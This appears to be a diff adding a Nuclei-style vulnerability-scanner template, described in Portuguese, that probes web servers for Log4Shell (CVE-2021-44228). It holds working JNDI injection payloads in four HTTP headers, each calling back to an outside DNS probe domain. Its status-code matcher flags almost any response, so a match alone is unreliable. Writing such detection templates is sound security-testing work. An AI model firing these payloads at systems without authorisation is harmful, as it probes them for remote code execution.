@@ -1,0 +1,29 @@
+id: log4shell-detect
+info:
+  name: Log4Shell (CVE-2021-44228) — Detecção via Header Injection
+  author: ingotus
+  severity: critical
+  description: >-
+    Log4Shell é uma vulnerabilidade crítica de RCE no Apache Log4j 2.x via JNDI lookup.
+    Injeta payloads em headers HTTP comuns para tentar detecção via OOB DNS/HTTP callback.
+    Confirmação requer integração com servidor interactsh ou DNS logger externo.
+  tags: [log4j, log4shell, rce, cve, cve-2021-44228]
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://logging.apache.org/log4j/2.x/security.html
+
+requests:
+  - method: GET
+    paths:
+      - "{{BaseURL}}/"
+
+    headers:
+      User-Agent: "${jndi:dns://log4shell-{{Hostname}}.ingotus-probe.net/ua}"
+      X-Forwarded-For: "${jndi:dns://log4shell-{{Hostname}}.ingotus-probe.net/xff}"
+      Referer: "${jndi:dns://log4shell-{{Hostname}}.ingotus-probe.net/ref}"
+      X-Api-Version: "${jndi:dns://log4shell-{{Hostname}}.ingotus-probe.net/api}"
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status: [200, 400, 500]
